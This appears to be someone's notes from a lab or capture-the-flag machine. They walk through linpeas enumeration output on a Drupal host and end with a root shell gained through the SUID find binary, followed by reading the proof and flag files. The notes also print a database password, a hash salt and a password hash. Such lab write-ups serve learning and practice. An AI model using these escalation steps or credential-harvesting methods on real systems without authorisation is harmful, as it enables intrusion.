
**Ran linpeas and searched thru output\.**

**1\) Exim running as user 101:
**
101       3086  0\.0  0\.0   7424   144 ?        Ss   03:31   0:00 /usr/sbin/exim4 \-bd \-q30m

2\) ╔══════════╣ Analyzing \.socket files
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets)

/lib/systemd/system/dbus\.socket is calling this writable listener: /var/run/dbus/system\_bus\_socket
/lib/systemd/system/dbus\.target\.wants/dbus\.socket is calling this writable listener: /var/run/dbus/system\_bus\_socket
/lib/systemd/system/sockets\.target\.wants/dbus\.socket is calling this writable listener: /var/run/dbus/system\_bus\_socket

3\) ╔══════════╣ Unix Sockets Listening
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets)

/dev/log
└─\(Read Write\)
/run/acpid\.socket
└─\(Read Write\)
/run/dbus/system\_bus\_socket
└─\(Read Write\)
**/run/mysqld/mysqld\.sock
**└─\(Read Write\)
/run/rpcbind\.sock
└─\(Read Write\)
/run/udev/control
└─\(Read \)
/var/run/acpid\.socket
└─\(Read Write\)
/var/run/dbus/system\_bus\_socket
└─\(Read Write\)
/var/run/mysqld/mysqld\.sock
└─\(Read Write\)
/var/run/rpcbind\.sock
└─\(Read Write\)

4\) ╔══════════╣ Active Ports
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports)

tcp        0      0 0\.0\.0\.0:22              0\.0\.0\.0:\*               LISTEN      \-               
tcp        0      0 127\.0\.0\.1:25            0\.0\.0\.0:\*               LISTEN      \-               
**tcp        0      0 0\.0\.0\.0:37701           0\.0\.0\.0:\*               LISTEN      \-               
tcp        0      0 127\.0\.0\.1:3306          0\.0\.0\.0:\*               LISTEN      \-               
**tcp        0      0 0\.0\.0\.0:111             0\.0\.0\.0:\*               LISTEN      \-               
tcp6       0      0 :::22                   :::\*                    LISTEN      \-               
tcp6       0      0 ::1:25                  :::\*                    LISTEN      \-               
tcp6       0      0 :::45295                :::\*                    LISTEN      \-               
tcp6       0      0 :::111                  :::\*                    LISTEN      \-               
tcp6       0      0 :::80                   :::\*                    LISTEN      \-               


5\) ╔══════════╣ Checking sudo tokens
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens)

ptrace protection is enabled \(\)
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

6\) ╔══════════╣ Last logons
reboot   system boot  Tue Mar 29 00:34:33 2022 \- Tue Mar 29 22:26:56 2022  \(21:52\)     0\.0\.0\.0
reboot   system boot  Tue Mar 29 00:31:08 2022 \- Tue Mar 29 00:32:25 2022  \(00:01\)     0\.0\.0\.0
root     tty1         Thu Feb 28 12:10:51 2019 \- down                      \(00:00\)     0\.0\.0\.0
root     tty1         Thu Feb 28 12:10:25 2019 \- Thu Feb 28 12:10:43 2019  \(00:00\)     0\.0\.0\.0
reboot   system boot  Thu Feb 28 12:10:13 2019 \- Thu Feb 28 12:11:16 2019  \(00:01\)     0\.0\.0\.0
**support  pts/0        Tue Feb 19 22:57:25 2019 \- Tue Feb 19 23:51:06 2019  \(00:53\)     192\.168\.0\.100
**root     tty1         Tue Feb 19 22:56:36 2019 \- down                      \(00:55\)     0\.0\.0\.0
reboot   system boot  Tue Feb 19 22:56:17 2019 \- Tue Feb 19 23:51:58 2019  \(00:55\)     0\.0\.0\.0

7\) ╔══════════╣ Analyzing Drupal Files \(limit 70\)
\-r\-\-r\-\-r\-\- 1 www\-data www\-data 15989 Feb 19  2019 /var/www/sites/default/settings\.php
'database' =\> 'drupaldb',
**'username' =\> 'dbuser',
'password' =\> 'R0ck3t',
**'host' =\> 'localhost',
'port' =\> '',
'driver' =\> 'mysql',
'prefix' =\> '',
\*   $drupal\_hash\_salt = file\_get\_contents\('/home/example/salt\.txt'\);
$drupal\_hash\_salt = 'X8gdX7OdYRiBnlHoj0ukhtZ7eO4EDrvMkhN21SWZocs';

8\) ╔══════════╣ Analyzing Backup Manager Files \(limit 70\)

\-rw\-r\-\-r\-\- 1 www\-data www\-data 270 Nov 21  2013 /var/www/modules/simpletest/tests/upgrade/drupal\-6\.user\-no\-password\-token\.database\.php
\-rw\-r\-\-r\-\- 1 www\-data www\-data 1114 Nov 21  2013 /var/www/modules/simpletest/tests/upgrade/drupal\-6\.user\-password\-token\.database\.php
'pass',
'pass' =\> '$S$DAK00p3Dkojkf4O/UizYxenguXnjv',

9\) ╔══════════╣ Searching uncommon passwd files \(splunk\)
passwd file: /etc/pam\.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/bash\-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

**10\) SUID: \-rwsr\-xr\-x 1 root root 159K Jan  6  2012 /usr/bin/find
\-rwsr\-xr\-x 1 root root 9\.5K Jun 20  2017 /usr/lib/pt\_chown  \-\-\-\>  GNU\_glibc\_2\.1/2\.1\.1\_\-6\(08\-1999\)

Stopping here to check gtfobins and try this, haven't seen it:
****
find \. \-exec /bin/sh \-p \\; \-quit****
**
**Tried this, failed:
**
find \. \-exec /bin/sh \\; \-quit
/bin/sh: 0: Illegal option \-p
/bin/sh: 0: Illegal option \-p
/bin/sh: 0: Illegal option \-p
id
uid=33\(www\-data\) gid=33\(www\-data\) groups=33\(www\-data\)

**Tried without \-p, OH SHIT:

**find \. \-exec /bin/sh \\; \-quit

id
uid=33\(www\-data\) gid=33\(www\-data\) euid=0\(root\) groups=0\(root\),33\(www\-data\)

**Looks like I am group root now, wowsers\.\. 

**ls /root
proof\.txt
thefinalflag\.txt
ls /root \-lsaF
total 36
4 drwx\-\-\-\-\-\-  4 root root 4096 Apr 11 03:33 \./
4 drwxr\-xr\-x 23 root root 4096 Feb 19  2019 \.\./
4 drwx\-\-\-\-\-\-  2 root root 4096 Mar 29 22:56 \.aptitude/
4 \-rw\-\-\-\-\-\-\-  1 root root    6 Mar 30 00:31 \.bash\_history
4 \-rw\-r\-\-r\-\-  1 root root  949 Feb 19  2019 \.bashrc
4 drwxr\-xr\-x  3 root root 4096 Feb 19  2019 \.drush/
4 \-rw\-r\-\-r\-\-  1 root root  140 Nov 20  2007 \.profile
4 \-rw\-r\-\-r\-\-  1 root root   33 Apr 11 03:33 proof\.txt
4 \-rw\-r\-\-r\-\-  1 root root  173 Feb 19  2019 thefinalflag\.txt
cat /root/proof\.txt
66877b1efa7e72bad25c67adaf8f2e03
cat /root/thefinalflag\.txt
Well done\!\!\!\!

Hopefully you've enjoyed this and learned some new skills\.

You can let me know what you thought of this little journey
by contacting me via Twitter \- @DCAU7

**

11\) ╔══════════╣ Unexpected in root
/initrd\.img
/initrd\.img\.old
/vmlinuz\.old
/vmlinuz
/selinux

12\) **╔══════════╣ Files \(scripts\) in /etc/profile\.d/
╚ [https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files](#https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files)

total 12
drwxr\-xr\-x  2 root root 4096 Feb 19  2019 \.
drwxr\-xr\-x 86 root root 4096 Mar 30 00:32 \.\.
\-rw\-r\-\-r\-\-  1 root root  660 Jun 18  2012 bash\_completion\.sh
**
13\) OMg, here it is:
**══════════╣ Searching root files in home dirs \(limit 30\)
/home/
/home/local\.txt
/root/
/root/\.profile
/root/\.drush
/root/\.drush/drush\.complete\.sh
/root/\.drush/drush\.prompt\.sh
/root/\.drush/cache
/root/\.drush/cache/usage
/root/\.drush/cache/download
/root/\.drush/cache/download/https\-\-\-updates\.drupal\.org\-release\-history\-views\-7\.x
/root/\.drush/cache/download/https\-\-\-ftp\.drupal\.org\-files\-projects\-views\-7\.x\-3\.20\.tar\.gz
/root/\.drush/cache/download/https\-\-\-updates\.drupal\.org\-release\-history\-drupal\-7\.x
/root/\.drush/cache/download/https\-\-\-ftp\.drupal\.org\-files\-projects\-ctools\-7\.x\-1\.15\.tar\.gz
/root/\.drush/cache/download/https\-\-\-updates\.drupal\.org\-release\-history\-ctools\-7\.x
/root/\.drush/cache/download/https\-\-\-ftp\.drupal\.org\-files\-projects\-drupal\-7\.24\.tar\.gz
/root/\.drush/drushrc\.php
/root/\.drush/drush\.bashrc
**/root/proof\.txt
/root/thefinalflag\.txt
**/root/\.bash\_history
/root/\.bashrc
/root/\.aptitude
/root/\.aptitude/cache

/usr/sbin/tcptraceroute
/usr/sbin/exipick
/usr/sbin/groupmod
/usr/sbin/VBoxControl
**
14\) **╔══════════╣ Searching installed mail applications
exim
sendmail
**

**15\) ╔══════════╣ Searching tables inside readable \.db/\.sql/\.sqlite files \(limit 100\)
Found: /var/lib/apt/listchanges\.db: Berkeley DB \(Hash, version 9, native byte\-order\)

16\) **interesting files \(writable\):**
/var/www/includes/database/database\.inc
/var/www/includes/database/log\.inc
/var/www/includes/database/mysql
/var/www/includes/database/mysql/database\.inc
/var/www/includes/database/mysql/install\.inc

/var/www/modules/node/node\.admin\.inc
/var/www/modules/node/node\.api\.php

/var/www/modules/path/path\.admin\.inc
/var/www/modules/path/path\.api\.php


17\) ╔══════════╣ Interesting GROUP writable files \(not in Home\) \(max 500\)
╚ https://book\.hacktricks\.xyz/linux\-unix/privilege\-escalation#writable\-files
Group www\-data:
/var/www/sites/default/files
/var/www/sites/default/files/styles

18\) ╔══════════╣ Searching \*password\* or \*credential\* files in home \(limit 70\)
/etc/pam\.d/common\-password
/etc/ssl/private/ssl\-cert\-snakeoil\.key
/usr/lib/grub/i386\-pc/password\.mod
/usr/lib/grub/i386\-pc/password\_pbkdf2\.mod
/usr/share/man/man7/credentials\.7\.gz
/usr/share/pam/common\-password
/usr/share/pam/common\-password\.md5sums
/var/cache/debconf/passwords\.dat
/var/lib/pam/password
/var/www/includes/password\.inc
/var/www/modules/simpletest/tests/password\.test
/var/www/modules/simpletest/tests/upgrade/drupal\-6\.user\-no\-password\-token\.database\.php
/var/www/modules/simpletest/tests/upgrade/drupal\-6\.user\-password\-token\.database\.php
/var/www/scripts/password\-hash\.sh

\<\-\-\-